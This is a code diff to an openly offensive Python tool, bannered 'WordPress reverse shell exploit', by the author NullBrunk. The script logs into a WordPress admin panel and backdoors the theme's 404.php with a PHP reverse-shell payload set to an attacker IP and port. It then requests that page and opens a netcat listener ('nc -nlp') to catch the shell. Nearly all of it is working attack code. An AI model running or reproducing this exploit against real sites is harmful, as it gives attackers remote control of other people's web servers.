@@ -1,11 +1,18 @@
+#!/usr/bin/env python3
+
+from time import sleep
+from os import system
 from pwn import log
+import threading
 import requests
 import argparse
 import re
 
+TIMEOUT = 2
 SESSION = requests.Session()
 THEME = ""
 TRIGGER = ""
+PORT = 0
 PAYLOAD = """
 <?php
 set_time_limit (0);
@@ -158,8 +165,9 @@ def parse_args() -> tuple:
     if(not args.url.endswith("/")):
         args.url += "/"
 
-    global PAYLOAD
+    global PAYLOAD, PORT
     PAYLOAD = PAYLOAD.replace("CHANGEIP", args.ip).replace("CHANGEPORT", str(args.port))
+    PORT = args.port
 
     return args.url, args.admin_username, args.admin_password
 
@@ -209,13 +217,15 @@ def do_backdoor(target: str, link: str):
     return '"success":true' in SESSION.post(f"{target}wp-admin/admin-ajax.php", data=data).text
 
 def trigger_backdoor(target: str):
+    global TIMEOUT
+    sleep(TIMEOUT)
     trigger_url = f"{target}wp-content/themes/{THEME}/{TRIGGER}"
-    log.info("GET " + trigger_url)
+    log.info("GET " + trigger_url + "\n\n")
     SESSION.get(trigger_url)
 
 
 def main(target: str, wp_user: str, wp_pass: str) -> bool:
-    log.info(f"Targeting {target} with {wp_user}:{wp_pass} ...")
+    log.info(f"Attempting to authenticate")
     
     if(not do_login(target, wp_user, wp_pass)):
         log.critical("Failed to authenticate")
@@ -229,7 +239,7 @@ def main(target: str, wp_user: str, wp_pass: str) -> bool:
         log.critical("404.php not found, cannot get a shell")
         return False
     
-    log.success(f"Found editable 404.php at {editable}")
+    log.success("Found 404.php at /" + editable.replace(target, ""))
 
 
     if(not do_backdoor(target, editable)):
@@ -239,10 +249,25 @@ def main(target: str, wp_user: str, wp_pass: str) -> bool:
     log.success(f"Backdoored successfully ...")
 
     log.info("Triggering backdoor ...")
-    trigger_backdoor(target)
-    log.success("Done")
 
+    x = threading.Thread(target=trigger_backdoor, args=(target,), daemon=True)
+    x.start()
+    system(f"nc -nlp {PORT}")
 
 if __name__ == "__main__":
+    print("""\x1b[33m
+ __      ____________      .__     
+/  \\    /  \\______   \\_____|  |__  
+\\   \\/\\/   /|     ___/  ___/  |  \\ 
+ \\        / |    |   \\___ \\|   Y  \\
+  \\__/\\  /  |____|  /____  >___|  /
+       \\/                \\/     \\/              
+\x1b[0m   \x1b[1m\x1b[33m   
+=[ WordPress reverse shell exploit 
+=[ NullBrunk
+\x1b[0m
+""")
     target, wp_user, wp_pass = parse_args()
     main(target, wp_user, wp_pass)
+    log.success("Done")
+
